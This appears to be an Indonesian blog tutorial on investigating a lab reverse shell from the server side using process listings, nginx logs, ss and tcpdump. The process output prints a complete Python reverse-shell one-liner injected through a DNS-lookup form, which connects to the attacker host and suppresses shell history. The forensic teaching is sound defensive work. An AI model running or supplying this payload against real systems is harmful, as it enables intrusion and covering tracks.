# Reverse Shell: Process, Log, and Network Analysis

[🇬🇧 Read in English](reverse-shell-server-side-en.md)

Halo semuanya,

Pada artikel sebelumnya kita berhasil memperoleh **Reverse Shell** melalui kerentanan **Command Injection** pada aplikasi **Mutillidae II**.

👉 **Artikel sebelumnya:**
https://imoon07.github.io/read.html?post=command-injection-reverse-shell

Kali ini kita berpindah sudut pandang.

Bukan lagi sebagai **attacker**, melainkan sebagai administrator sistem atau security analyst yang ingin memahami jejak yang ditinggalkan ketika Reverse Shell berhasil dijalankan.

Artikel ini berfokus pada tiga artefak utama yang dapat diamati langsung dari sisi server:

- Process
- Log
- Network

---

# Apa itu Reverse Shell Analysis?

Reverse Shell Analysis adalah proses mengidentifikasi aktivitas Reverse Shell dari sisi server setelah payload berhasil dieksekusi.

Alih-alih membahas cara membuat payload, artikel ini berfokus pada **apa yang terjadi di sistem** ketika sebuah Reverse Shell berhasil berjalan.

Dengan memahami proses, log, dan koneksi jaringan yang terbentuk, kita dapat mengenali indikator aktivitas yang tidak normal serta memahami bagaimana sebuah serangan terlihat dari perspektif defender.

---

# Mengapa Penting?

Ketika Reverse Shell berhasil dijalankan, server akan meninggalkan berbagai artefak yang dapat diamati, seperti:

- Proses baru yang dijalankan oleh aplikasi web.
- Log akses aplikasi yang merekam request dari attacker.
- Koneksi jaringan keluar (*outbound connection*) menuju mesin attacker.

Ketiga artefak tersebut saling melengkapi dan dapat digunakan sebagai dasar untuk melakukan investigasi maupun validasi insiden keamanan.

---

# Prasyarat

Artikel ini merupakan lanjutan dari demonstrasi Reverse Shell sebelumnya.

Pastikan Reverse Shell telah berhasil diperoleh terlebih dahulu melalui kerentanan **Command Injection**.

```text
Command Injection
        │
        ▼
Command Execution
        │
        ▼
Reverse Shell
```

---

# Flow Investigasi

```text
            Reverse Shell
                  │
                  ▼
        Process Investigation
                  │
                  ▼
          Log Investigation
                  │
                  ▼
       Network Investigation
```

---

# Topologi Lab

| Peran | Keterangan | IP Address |
| :--- | :--- | :--- |
| **Attacker** | Kali Linux | `10.10.10.149` |
| **Target** | Ubuntu Server (Mutillidae II) | `10.10.10.2` |

---

# Demonstrasi

## 1. Investigasi Process

Langkah pertama adalah melihat proses yang sedang berjalan pada server.

```bash
ps aux | grep python
```

![Proses dari user www-data](proses-from-user-www-data.png)

### Output

```text
root         874  0.0  1.1 109688 23292 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
www-data    3861  0.0  0.0   2800  1852 ?        S    16:13   0:00 sh -c -- nslookup google.com; python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
www-data    3868  0.0  0.5  18648 11736 ?        S    16:13   0:00 python3 -c import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();
```

### Apa yang ditemukan?

Terlihat bahwa proses `python3` dijalankan oleh user **www-data**, yaitu akun yang umumnya digunakan oleh web server seperti Apache atau Nginx.

Selain itu terlihat pula payload:

```text
nslookup google.com;
python3 -c ...
```

### Apa arti output tersebut?

Normalnya akun `www-data` hanya menjalankan aplikasi web.

Apabila akun tersebut menjalankan interpreter seperti **Python**, **Bash**, **Perl**, atau bahasa lainnya yang membuka koneksi keluar, kondisi ini dapat menjadi indikator adanya **Command Injection** maupun **Remote Code Execution (RCE)**.

Pada demonstrasi ini proses Python menjadi artefak pertama yang menunjukkan aktivitas Reverse Shell.

---

## 2. Investigasi Log

Langkah berikutnya adalah melihat request yang diterima oleh web server.

```bash
tail -f /var/log/nginx/access.log
```

![Command Injection](Command-injection.png)

![Log Nginx](log-nginx.png)

### Output

```text
10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771
10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773
10.10.10.149 - - [26/Jun/2026:16:14:15 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 504 176
```

### Apa yang ditemukan?

Terlihat beberapa request **HTTP POST** menuju endpoint:

```text
/index.php?page=dns-lookup.php
```

yang berasal dari IP attacker.

### Apa arti output tersebut?

Request tersebut menunjukkan bahwa attacker berulang kali mengakses fitur **DNS Lookup** yang memiliki kerentanan **Command Injection**.

Meskipun access log tidak menampilkan payload secara lengkap, informasi seperti alamat IP, endpoint, metode HTTP, dan waktu akses sudah cukup untuk dikorelasikan dengan proses Python yang ditemukan sebelumnya.

---

## 3. Investigasi Network

Karakteristik utama Reverse Shell adalah terbentuknya koneksi keluar (*outbound connection*) dari server menuju mesin attacker.

Periksa menggunakan perintah berikut.

```bash
ss -tnp
```

![State Active Open Port](state-active-open-port.png)

### Output

```text
State      Recv-Q Send-Q Local Address:Port    Peer Address:Port
ESTAB      0      0      10.10.10.2:49342      10.10.10.149:9001
users:(("python3",pid=3868,fd=3))
```

### Apa yang ditemukan?

Terlihat koneksi dengan status **ESTABLISHED** menuju alamat IP attacker pada port **9001**.

Koneksi tersebut dibuat oleh proses **python3** dengan PID **3868**.

### Apa arti output tersebut?

Informasi ini mengonfirmasi bahwa proses Python yang ditemukan sebelumnya memang membuka koneksi keluar menuju mesin attacker.

Korelasi antara **PID**, **proses**, dan **koneksi jaringan** memberikan bukti kuat bahwa Reverse Shell sedang aktif.

---

Apabila ingin melihat komunikasi jaringan secara langsung, gunakan:

```bash
sudo tcpdump -i any port 9001 -nn -A
```

![Network tcpdump](network-tcpdump.png)

### Output

```text
16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001

www-data@server01:/var/www/hack/mutillidae/src$
```

### Apa yang ditemukan?

Terlihat komunikasi TCP menuju mesin attacker beserta shell prompt:

```text
www-data@server01:/var/www/hack/mutillidae/src$
```

### Apa arti output tersebut?

Karena Reverse Shell pada demonstrasi ini menggunakan koneksi TCP tanpa enkripsi, isi komunikasi masih dapat dibaca dalam bentuk **plaintext**.

Kemunculan shell prompt menunjukkan bahwa attacker telah berhasil memperoleh shell interaktif pada server target.

---

# Ringkasan Temuan

| Artefak | Temuan |
| :--- | :--- |
| **Process** | `python3` dijalankan oleh user `www-data` |
| **Log** | Request HTTP POST menuju endpoint `dns-lookup.php` |
| **Network** | Koneksi keluar menuju IP attacker pada port `9001` |

Ketiga artefak tersebut saling melengkapi dan memberikan gambaran yang jelas mengenai aktivitas Reverse Shell tanpa memerlukan tools forensik yang kompleks.

---

# Apa Langkah Selanjutnya?

Setelah memahami artefak yang ditinggalkan oleh Reverse Shell, langkah berikutnya adalah melakukan **Linux Enumeration** untuk mengidentifikasi kondisi sistem yang telah berhasil diakses.

Tahap ini meliputi:

- Identifikasi pengguna aktif.
- Informasi sistem operasi dan kernel.
- Struktur direktori aplikasi.
- Konfigurasi jaringan.
- Service dan proses yang berjalan.

---

# Kesimpulan

Reverse Shell tidak hanya memberikan akses kepada attacker, tetapi juga meninggalkan berbagai jejak pada sistem target.

Melalui pemeriksaan **proses**, **log aplikasi**, dan **koneksi jaringan**, administrator sistem maupun security analyst dapat memahami bagaimana payload dijalankan serta bagaimana koneksi Reverse Shell terbentuk.

Meskipun demonstrasi ini dilakukan pada lingkungan lab yang sederhana, pendekatan investigasi yang sama dapat diterapkan sebagai dasar analisis insiden pada sistem Linux.

---

# Referensi

- MITRE ATT&CK – T1059: Command and Scripting Interpreter  
  https://attack.mitre.org/techniques/T1059/

- Nginx Documentation – Access Log  
  https://nginx.org/en/docs/http/ngx_http_log_module.html

- Linux Manual Pages  
  https://man7.org/linux/man-pages/

- tcpdump Documentation  
  https://www.tcpdump.org/

---

Terima kasih sudah membaca.

Semoga tulisan ini dapat membantu memahami bagaimana Reverse Shell terlihat dari sisi server serta bagaimana proses investigasi sederhana dapat dilakukan menggunakan utilitas bawaan Linux.
